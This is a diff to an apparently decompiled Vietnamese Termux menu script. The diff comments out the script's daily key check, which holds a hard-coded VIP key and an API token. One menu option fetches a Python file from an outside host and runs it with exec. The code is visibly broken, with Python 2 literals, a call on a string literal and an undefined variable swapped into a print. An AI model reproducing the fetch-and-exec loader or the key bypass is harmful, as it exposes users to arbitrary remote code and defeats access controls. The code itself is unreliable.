@@ -60,77 +60,77 @@ url = 'http://kiemtraip.com/raw.php'
 ip = get_ip_from_url(url)
 os.system('clear')
 banner()
-a = now.strftime('%d')
-h = int(now.strftime('%d'))
-ngay_trc = h - 2
-ngay_mai = h + 1
-time = datetime.now().strftime('%Hh:%Mp:%Ss')
-b = now.strftime('%m')
-day = now.strftime('%d-%m-%Y')
-today = now.strftime('%d-%m-%Y')
-hientai = now.strftime('%m-%Y')
-ngay = int(strftime('%d'))
-key1 = str(ngay * 1246881999 + 0xAC2626E5L)
-key = 'HDT-' + key1
-keyvip = '881995'
-ip = requests.post('https://api.proxyscrape.com/ip.php').text
-long_url = f'''http://offvn.io.vn/hdt.html?key={key}'''
-ip = requests.post('https://api.proxyscrape.com/ip.php').text
-url_dilink = requests.get(f'''https://dilink.net/api_rv.php?token=r0vl9pwku8l8pwoq04psn1bh9nycvjstjcinbec4l6jara3y7leybxd8e60lhp88d9s6dvt0sxhusl5ozrm7pzq5m2k83k86vlrl&url={long_url}''').text
-ip = requests.post('https://api.proxyscrape.com/ip.php').text
-if '<link rel="canonical" href="' in url_dilink:
-    link_key_dilink = url_dilink.split('<link rel="canonical" href="')[1].split('">')[0]
-link_key_dilink = 'Không Thể Tạo Url!!!'
-file_key = f'''key_ngay{ngay_hom_nay}.txt'''
-file_key_cu = f'''key_ngay{ngay_trc}.txt'''
-check_file_key = os.path.exists(file_key)
-if check_file_key == False:
-    print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
-    print(f'''{thanh_xau}\x1b[38;5;226mĐÂY LÀ TOOL FREE NÊN KEY SẼ THAY ĐỔI MỖI NGÀY !!''')
-    print(f'''{thanh_xau}\x1b[38;5;207mHôm Nay Ngày : \x1b[38;5;46m{ngay_hom_nay}/{thang_nay}/{nam_}''')
-    print(f'''{thanh_xau}\x1b[38;5;207mGiờ Hiện Tại : \x1b[38;5;46m{time}''')
-    print(f'''{thanh_xau}\x1b[38;5;207mIP Của Bạn Là : \x1b[38;5;46m{ip}''')
-    print('\x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝')
-    print(f'''{thanh_xau}\x1b[38;5;46mLink Lấy Key Là : \x1b[38;5;226m{link_key_dilink}''')
-    os.system(f'''termux-open-url {link_key_dilink} ''')
-    ma = input(f'''{thanh_xau}\x1b[38;5;46mNhập API Key Ngày \x1b[38;5;207m{ngay_hom_nay}/{thang_nay}/{nam_}: \x1b[38;5;226m''')
-    if ma == key or ma == keyvip:
-        print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Chính Xác''')
-        luu = open(file_key, 'a+')
-        luu.write(ma)
-        luu.close()
-    if ma != key or ma != keyvip:
-        print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai''')
-if check_file_key == True:
-    print(f'''{thanh_xau}\x1b[38;5;46mĐang Lấy Key...''', end = '\r')
-    sleep(1)
-    k = open(file_key, 'r')
-    ma = k.read()
-    k.close()
-    if ma == key or ma != keyvip:
-        print(f'''{thanh_xau}\x1b[38;5;46mLấy Key Thành Công       ''', end = '\r')
-        sleep(0.5)
-    if ma != key or ma != keyvip:
-        if os.path.exists(file_key) == True:
-            os.system(f'''rm {file_key}''')
-        os.system(f'''rm {file_key}''')
-        print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai         ''')
-        ma = input(f'''{thanh_xau}\x1b[38;5;46mNhập API Key Ngày \x1b[38;5;207m{ngay_hom_nay}/{thang_nay}/{nam_}: \x1b[38;5;226m''')
-        if ma == key or ma != keyvip:
-            print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Chính Xác''')
-            luu = open(file_key, 'a+')
-            luu.write(ma)
-            luu.close()
-        if ma != key or ma != keyvip:
-            print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai           ''')
+#a = now.strftime('%d')
+#h = int(now.strftime('%d'))
+#ngay_trc = h - 2
+#ngay_mai = h + 1
+#time = datetime.now().strftime('%Hh:%Mp:%Ss')
+#b = now.strftime('%m')
+#day = now.strftime('%d-%m-%Y')
+#today = now.strftime('%d-%m-%Y')
+#hientai = now.strftime('%m-%Y')
+#ngay = int(strftime('%d'))
+#key1 = str(ngay * 1246881999 + 0xAC2626E5L)
+#key = 'HDT-' + key1
+#keyvip = '881995'
+#ip = requests.post('https://api.proxyscrape.com/ip.php').text
+#long_url = f'''http://offvn.io.vn/hdt.html?key={key}'''
+#ip = requests.post('https://api.proxyscrape.com/ip.php').text
+#url_dilink = requests.get(f'''https://dilink.net/api_rv.php?token=r0vl9pwku8l8pwoq04psn1bh9nycvjstjcinbec4l6jara3y7leybxd8e60lhp88d9s6dvt0sxhusl5ozrm7pzq5m2k83k86vlrl&url={long_url}''').text
+#ip = requests.post('https://api.proxyscrape.com/ip.php').text
+#if '<link rel="canonical" href="' in url_dilink:
+#    link_key_dilink = url_dilink.split('<link rel="canonical" href="')[1].split('">')[0]
+#link_key_dilink = 'Không Thể Tạo Url!!!'
+#file_key = f'''key_ngay{ngay_hom_nay}.txt'''
+#file_key_cu = f'''key_ngay{ngay_trc}.txt'''
+#check_file_key = os.path.exists(file_key)
+#if check_file_key == False:
+#print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
+#print(f'''{thanh_xau}\x1b[38;5;226mĐÂY LÀ TOOL FREE NÊN KEY SẼ THAY ĐỔI MỖI NGÀY !!''')
+#print(f'''{thanh_xau}\x1b[38;5;207mHôm Nay Ngày : \x1b[38;5;46m{ngay_hom_nay}/{thang_nay}/{nam_}''')
+#print(f'''{thanh_xau}\x1b[38;5;207mGiờ Hiện Tại : \x1b[38;5;46m{time}''')
+#print(f'''{thanh_xau}\x1b[38;5;207mIP Của Bạn Là : \x1b[38;5;46m{ip}''')
+#print('\x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝')
+#print(f'''{thanh_xau}\x1b[38;5;46mLink Lấy Key Là : \x1b[38;5;226m{link_key_dilink}''')
+#    os.system(f'''termux-open-url {link_key_dilink} ''')
+   # ma = input(f'''{thanh_xau}\x1b[38;5;46mNhập API Key Ngày \x1b[38;5;207m{ngay_hom_nay}/{thang_nay}/{nam_}: \x1b[38;5;226m''')
+   # if ma == key or ma == keyvip:
+   #     print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Chính Xác''')
+     #   luu = open(file_key, 'a+')
+   #     luu.write(ma)
+      #  luu.close()
+ #   if ma != key or ma != keyvip:
+    #print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai''')
+#if check_file_key == True:
+ #   print(f'''{thanh_xau}\x1b[38;5;46mĐang Lấy Key...''', end = '\r')
+ #   sleep(1)
+   # k = open(file_key, 'r')
+   # ma = k.read()
+ #   k.close()
+  #  if ma == key or ma != keyvip:
+    #    print(f'''{thanh_xau}\x1b[38;5;46mLấy Key Thành Công       ''', end = '\r')
+    #    sleep(0.5)
+ #   if ma != key or ma != keyvip:
+    #    if os.path.exists(file_key) == True:
+      #      os.system(f'''rm {file_key}''')
+      #  os.system(f'''rm {file_key}''')
+      #  print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai         ''')
+   #     ma = input(f'''{thanh_xau}\x1b[38;5;46mNhập API Key Ngày \x1b[38;5;207m{ngay_hom_nay}/{thang_nay}/{nam_}: \x1b[38;5;226m''')
+     #   if ma == key or ma != keyvip:
+     #       print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Chính Xác''')
+     #       luu = open(file_key, 'a+')
+      #      luu.write(ma)
+      #      luu.close()
+       # if ma != key or ma != keyvip:
+         #   print(f'''{thanh_xau}\x1b[38;5;46mAPI Key Sai           ''')
 if os.name == 'nt':
     pass
-'cls'('clear')
+#'cls'('clear')
 banner()
 print('\x1b[38;5;207m╔══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╗')
 print(f'''{thanh_xau}\x1b[38;5;226mCHÀO MỪNG BẠN ĐÃ VÀO TOOL !!''')
 print(f'''{thanh_xau}\x1b[38;5;207mHôm Nay Ngày : \x1b[38;5;46m{ngay_hom_nay}/{thang_nay}/{nam_}''')
-print(f'''{thanh_xau}\x1b[38;5;207mGiờ Hiện Tại : \x1b[38;5;46m{time}''')
+print(f'''{thanh_xau}\x1b[38;5;207mGiờ Hiện Tại : \x1b[38;5;46m{Anime}''')
 print(f'''{thanh_xau}\x1b[38;5;207mIP Của Bạn Là : \x1b[38;5;46m{ip}''')
 print('\x1b[38;5;207m╚══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;226m══\x1b[38;5;99m══\x1b[38;5;46m══\x1b[38;5;51m══\x1b[38;5;208m══\x1b[38;5;51m══\x1b[38;5;46m══\x1b[38;5;99m══\x1b[38;5;207m══\x1b[38;5;51m══\x1b[38;5;46m═╝')
 print('\x1b[38;5;46m-----------------------------------------------------------------')
@@ -313,6 +313,6 @@ if chon == 40:
 if chon == 41:
     exec(requests.get('http://off-vn.x10.mx/comments.py').text)
     ip = requests.post('https://api.proxyscrape.com/ip.php').text
-    return None
+#    return None
 print(' Sai Lựa Chọn ')
 exit()
